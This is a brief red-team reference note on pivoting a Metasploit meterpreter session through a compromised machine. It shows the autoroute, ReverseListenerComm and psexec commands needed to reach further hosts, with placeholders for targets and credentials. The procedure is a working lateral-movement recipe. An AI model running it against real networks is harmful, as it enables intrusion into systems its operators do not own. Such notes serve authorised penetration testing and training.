---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - port-forward
  - metasploit-framework
  - cross-platform
credits:
  - Matthew Toussain
---
# Metasploit

> [!NOTE]
> This can work even if the compromised system is not a Windows operating system as long the session type is `meterpreter` payload.

Make the `meterpreter` connection act as a **p2p (peer-to-peer)** without requiring to use SMB namepipe or bind implant callbacks. Assuming you've gained a initial access, add a rule to route traffic.

```
meterpreter > run post/multi/manage/autoroute subnet=<subnet> netmask=/24
```

In this demonstration, we'll be using #psexec to exploit the target to pivot off from the compromised machine. Set `ReverseListenerComm` with a session ID. This will tunnel the `meterpreter` session.

```
meterpreter > background

msf exploit(windows/smb/psexec) > set ReverseListenerComm <session_ID>
```

Then set the IP address and port of the computer that's compromised.

```
msf exploit(windows/smb/psexec) > set lhost <pivot_IP>

msf exploit(windows/smb/psexec) > set lport <pivot_PORT>
```

Exploit the target.

```
msf exploit(windows/smb/psexec) > run rhosts=<target_IP> smbuser=<username> smbpass=<password>
```

You can list the `meterpreter` sessions to see that it is pivoting off from a compromised system.

```
meterpreter > background

msf exploit(windows/smb/psexec) > sessions -l
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x06 - Pivot/Cross Platform/SOCKS Proxy/C2 Frameworks/Metasploit]]

### Matthew Toussain

- [Matthew Toussain: Tactics Tuesday | Mass Meterpreter Single Channel](https://www.youtube.com/watch?v=IsrWJL0gIlg)